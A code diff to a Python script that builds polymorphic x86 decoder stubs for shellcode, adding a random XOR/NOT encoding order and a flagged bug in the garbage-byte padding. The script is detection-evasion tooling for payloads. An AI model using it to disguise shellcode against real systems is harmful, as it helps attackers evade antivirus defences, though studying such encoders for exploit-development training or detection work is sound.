@@ -14,6 +14,7 @@ callListInstructions = ["mov", "xor", "sub", "add"]
 callListRegisters = ["eax", "ebx", "ecx", "edx", "esi", "edi"]
 unusedRegisters = ["eax", "ebx", "ecx", "edx"]
 commonRegisters = ["eax", "ebx", "ecx", "edx"]
+xorNotDirection = random.randint(0, 1)
 
 
 def jmpPoly(count):
@@ -72,11 +73,18 @@ else:
 	originalShellcodeLength = 0
 	for x in bytearray(content):
 		originalShellcodeLength += 1
-		# XOR encode
-		y = x^xorByte
-		# NOT encode
-		curValue = ~y
-		curValue = hex(curValue & 0xff)
+		if xorNotDirection == 0:
+			# XOR encode
+			y = x^xorByte
+			# NOT encode
+			curValue = ~y
+			curValue = hex(curValue & 0xff)
+		else:
+			# NOT encode
+			y = ~x
+			y = y & 0xff
+			# XOR encode
+			curValue = hex(y^xorByte)
 		input += curValue
 		if originalShellcodeLength == len(bytearray(content)):
 			input += ", " + str(stoppingByte)
@@ -107,12 +115,16 @@ else:
 	randomString = [random.choice(string.ascii_letters) for n in xrange(10)]
 	garbageLabel = "".join(randomString)
 	garbageBytes = ""
+
+###########################################################
+# ToDo: Find Bug!
 	numberOfGarbageBytes = random.randint(0, 0)
 	for i in range(numberOfGarbageBytes):
 		tmpRnd2 = random.randint(1, 255)
 		garbageBytes += str(hex(tmpRnd2)) + ", "
 	garbageBytes = garbageBytes[:len(garbageBytes)-2]
 	garbageLabel += ": db " + garbageBytes + "\n"
+##########################################################
 
 	# define which register is used for what
 	tmp = random.randint(0, len(unusedRegisters)-1)
@@ -174,8 +186,12 @@ else:
         if tmpRand == 0:
                 assembler += "\tmov " + tmpValue + ", " + commonRegisters[tmpRegister] + "\n"
 	assembler += "\txor " + tmpValue + ", " + tmpValue + "\n"
-	assembler += "\tnot byte [" + popRegister + " +  " + str(numberOfGarbageBytes) + "]\n"	
-	assembler += "\txor byte [" + popRegister + " +  " + str(numberOfGarbageBytes) + "], " + str(hex(xorByte)) + "\n"
+	if xorNotDirection == 0:
+		assembler += "\tnot byte [" + popRegister + " +  " + str(numberOfGarbageBytes) + "]\n"	
+		assembler += "\txor byte [" + popRegister + " +  " + str(numberOfGarbageBytes) + "], " + str(hex(xorByte)) + "\n"
+	else:
+		assembler += "\txor byte [" + popRegister + " +  " + str(numberOfGarbageBytes) + "], " + str(hex(xorByte)) + "\n"
+		assembler += "\tnot byte [" + popRegister + " +  " + str(numberOfGarbageBytes) + "]\n"
 	# access decode procedure
 	assembler += decode + ":\n"
 	assembler += "\tmov " + tmpValueLowerByte + ", byte [" + popRegister + " + " + insertIterator + " + " + str(numberOfGarbageBytes) + "]\n"
@@ -183,8 +199,12 @@ else:
 	assembler += "\tjz short " + shellcodeLabel + "\n"
 	assembler += "\tmov " + tmpValueLowerByte + ", byte [" + popRegister + " + " + insertIterator + " + 1 + " + str(numberOfGarbageBytes) + "]\n"
 	assembler += "\tmov byte [" + shellIterator + "], " + tmpValueLowerByte + "\n"
-	assembler += "\tnot byte [" + shellIterator + "]\n"
-	assembler += "\txor byte [" + shellIterator + "], " + str(hex(xorByte)) + "\n"
+	if xorNotDirection == 0:	
+		assembler += "\tnot byte [" + shellIterator + "]\n"
+		assembler += "\txor byte [" + shellIterator + "], " + str(hex(xorByte)) + "\n"
+	else:
+		assembler += "\txor byte [" + shellIterator + "], " + str(hex(xorByte)) + "\n"
+		assembler += "\tnot byte [" + shellIterator + "]\n"
 	tmpRand = random.randint(0, 1)
 	if tmpRand == 0:
 		assembler += "\tinc " + shellIterator + "\n"
